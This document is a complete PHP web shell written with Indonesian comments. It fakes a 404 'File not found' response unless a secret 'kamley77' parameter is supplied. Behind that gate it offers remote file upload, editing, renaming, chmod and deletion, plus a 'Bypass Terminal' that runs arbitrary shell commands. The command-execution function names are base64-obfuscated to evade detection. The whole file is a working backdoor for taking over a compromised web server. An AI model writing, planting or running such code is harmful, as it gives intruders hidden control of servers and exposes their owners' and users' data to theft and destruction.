<?php
// 1. GERBANG AKSES UTAMA
// Skrip hanya berjalan jika kode.php?kamley77= diakses
if (!isset($_GET['kamley77'])) {
    // Memberikan respon 404 palsu agar pihak luar mengira file ini tidak ada
    header("HTTP/1.1 404 Not Found");
    die("File not found.");
}

// 2. KODE ASLI ANDA (Hanya dieksekusi jika lolos gerbang di atas)
@ini_set('display_errors', 1); @error_reporting(E_ALL);
echo "<center><h3>SERVER TEST MODE - Authorized Access</h3></center>";

// Untuk mempertahankan navigasi folder di dalam file manager Anda,
// setiap link internal harus membawa kembali parameter kamley77
$auth_param = "&kamley77=" . urlencode($_GET['kamley77']);

$dir = realpath(isset($_GET['d']) ? $_GET['d'] : '.');
if (!$dir || !is_dir($dir)) die("Error: Direktori tidak valid.");
$msg = ""; $sep = DIRECTORY_SEPARATOR;

// Penanganan aksi POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $a = $_POST['action'];
    if ($a === 'upload' && isset($_FILES['f'])) {
        $msg = move_uploaded_file($_FILES['f']['tmp_name'], $dir.$sep.basename($_FILES['f']['name'])) ? "Sukses upload" : "Gagal upload";
    } elseif ($a === 'new_folder' && !empty($_POST['n'])) {
        $msg = @mkdir($dir.$sep.$_POST['n'], 0755) ? "Folder dibuat" : "Gagal buat folder";
    } elseif ($a === 'new_file' && !empty($_POST['n'])) {
        $msg = @file_put_contents($dir.$sep.$_POST['n'], '') !== false ? "File dibuat" : "Gagal buat file";
    } elseif ($a === 'rename' && !empty($_POST['o']) && !empty($_POST['n'])) {
        $msg = @rename($dir.$sep.$_POST['o'], $dir.$sep.$_POST['n']) ? "Nama diganti" : "Gagal ganti nama";
    } elseif ($a === 'chmod' && !empty($_POST['t']) && !empty($_POST['v'])) {
        $msg = @chmod($dir.$sep.$_POST['t'], octdec($_POST['v'])) ? "CHMOD diganti" : "Gagal CHMOD";
    } elseif ($a === 'save' && !empty($_POST['n'])) {
        $msg = @file_put_contents($dir.$sep.$_POST['n'], $_POST['c']) !== false ? "Perubahan disimpan" : "Gagal simpan";
    } elseif ($a === 'cmd' && !empty($_POST['command'])) {
        $cmd = $_POST['command'];
        $run_cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') 
            ? "cd /d " . escapeshellarg($dir) . " && " . $cmd 
            : "cd " . escapeshellarg($dir) . " && " . $cmd;
        $run_cmd .= " 2>&1";

        $funcs = ['c2hlbGxfZXhlYw==', 'ZXhlYw==', 'c3lzdGVt', 'cGFzc3RocnU='];
        $executed = false;
        $cmd_output = "";

        foreach ($funcs as $f_enc) {
            $f = base64_decode($f_enc);
            if (function_exists($f)) {
                if ($f === 'shell_exec') { $cmd_output = $f($run_cmd); }
                elseif ($f === 'exec') { $out_arr = []; $f($run_cmd, $out_arr); $cmd_output = implode("\n", $out_arr); }
                elseif ($f === 'system' || $f === 'passthru') { ob_start(); $f($run_cmd); $cmd_output = ob_get_clean(); }
                $executed = true; break;
            }
        }
        if (!$executed) { $cmd_output = "Error: Fungsi eksekusi diblokir oleh server."; }
    }
}

if (isset($_GET['action']) && $_GET['action'] === 'del' && !empty($_GET['item'])) {
    $p = $dir.$sep.$_GET['item'];
    $msg = (is_dir($p) ? @rmdir($p) : @unlink($p)) ? "Item dihapus" : "Gagal hapus";
}
if ($msg) echo "<p style='color:blue;'><b>Status: $msg</b></p>";

$parts = explode($sep, trim($dir, $sep)); $acc = '';
$bc = (strpos($dir, ':') === 1) ? '' : "<a href='?d=".urlencode($sep)."{$auth_param}'>$sep</a>";
foreach ($parts as $i => $pt) {
    if (empty($pt)) continue;
    $acc .= (strpos($dir, ':') === 1 && $i === 0) ? $pt : $sep.$pt;
    $bc .= "<a href='?d=".urlencode($acc)."{$auth_param}'>".htmlspecialchars($pt)."</a>".$sep;
}

$dir_color = is_writable($dir) ? "green" : "red";
echo "<p><b>Dir:</b> <span style='color:$dir_color; font-weight:bold;'>$bc</span> <a href='?d=".urlencode(dirname($dir))."{$auth_param}'>[⬆️ Atas]</a></p>";

if (isset($_GET['action']) && $_GET['action'] === 'edit' && !empty($_GET['item'])) {
    $ep = $dir.$sep.$_GET['item'];
    if (file_exists($ep) && !is_dir($ep)) {
        echo "<form method='POST'><input type='hidden' name='action' value='save'><input type='hidden' name='n' value='".htmlspecialchars($_GET['item'])."'>";
        echo "<textarea name='c' rows='8' style='width:100%;'>".htmlspecialchars(file_get_contents($ep))."</textarea><br><button type='submit'>Simpan</button> <a href='?d=".urlencode($dir)."{$auth_param}'>Batal</a></form><hr>";
    }
}

echo "<fieldset><legend>Kontrol</legend><form method='POST' enctype='multipart/form-data' style='display:inline;'><input type='hidden' name='action' value='upload'>Upload: <input type='file' name='f'><button type='submit'>Go</button></form> | <form method='POST' style='display:inline;'><input type='hidden' name='action' value='new_folder'><input type='text' name='n' placeholder='Folder Baru' required><button type='submit'>+F</button></form> | <form method='POST' style='display:inline;'><input type='hidden' name='action' value='new_file'><input type='text' name='n' placeholder='File Baru' required><button type='submit'>+T</button></form></fieldset><br>";

echo "<fieldset style='background-color:#1e1e1e; color:#fff; border:1px solid #555; padding:10px; font-family:monospace;'>";
echo "<legend style='background:#333; padding:2px 10px; border:1px solid #555;'>Bypass Terminal (Current Dir)</legend>";
echo "<form method='POST'><input type='hidden' name='action' value='cmd'>";
echo "<span style='color:#0f0;'>$ </span><input type='text' name='command' style='background:#000; color:#0f0; border:1px solid #444; width:80%; padding:4px; font-family:monospace;' placeholder='Masukkan perintah' autocomplete='off' required> ";
echo "<button type='submit' style='background:#444; color:#fff; border:1px solid #666; padding:4px 10px; cursor:pointer;'>Kirim</button></form>";

if (isset($cmd_output) && $cmd_output !== "") {
    echo "<p style='margin:10px 0 2px 0; color:#aaa;'>Output dari: <b>".htmlspecialchars($cmd)."</b></p>";
    echo "<pre style='background:#000; color:#0f0; padding:10px; border:1px solid #333; margin:0; white-space:pre-wrap; overflow-x:auto;'>".htmlspecialchars($cmd_output)."</pre>";
}
echo "</fieldset><br>";

if (function_exists('scandir') && ($files = @scandir($dir)) !== false) {
    echo "<table border='1' cellpadding='4' style='border-collapse:collapse; min-width:600px;'><tr bgcolor='#eee'><th>Nama</th><th>Tipe</th><th>CHMOD</th><th>Aksi</th></tr>";
    foreach ($files as $f) {
        if ($f == '.' || $f == '..') continue;
        $fp = $dir.$sep.$f; $is_d = is_dir($fp); $prm = substr(sprintf('%o', @fileperms($fp)), -4);
        $item_color = is_writable($fp) ? "green" : "red";
        $display_name = "<span style='color:$item_color; font-weight:bold;'>" . htmlspecialchars($f) . "</span>";

        echo "<tr><td>".($is_d ? "📁 <a href='?d=".urlencode($fp)."{$auth_param}'>$display_name</a>" : "📄 $display_name")."</td><td>".($is_d ? "Dir" : "File")."</td>";
        echo "<td><form method='POST' style='display:inline;'><input type='hidden' name='action' value='chmod'><input type='hidden' name='t' value='".htmlspecialchars($f)."'><input type='text' name='v' value='$prm' size='4'><button type='submit'>Set</button></form></td>";
        echo "<td><form method='POST' style='display:inline;'><input type='hidden' name='action' value='rename'><input type='hidden' name='o' value='".htmlspecialchars($f)."'><input type='text' name='n' value='".htmlspecialchars($f)."' size='10'><button type='submit'>Ren</button></form> ";
        if (!$is_d) echo "<a href='?d=".urlencode($dir)."&action=edit&item=".urlencode($f)."{$auth_param}'>[Edit]</a> ";
        echo "<a href='?d=".urlencode($dir)."&action=del&item=".urlencode($f)."{$auth_param}' onclick='return confirm(\"Hapus?\")' style='color:red;'>[X]</a></td></tr>";
    }
    echo "</table>";
} else { echo "Fungsi scandir() mati atau gagal."; }

echo "<br><div style='text-align:center; font-family:sans-serif; font-size:12px; color:#555;'>Copyright © Kamley77 2026</div>";
?>
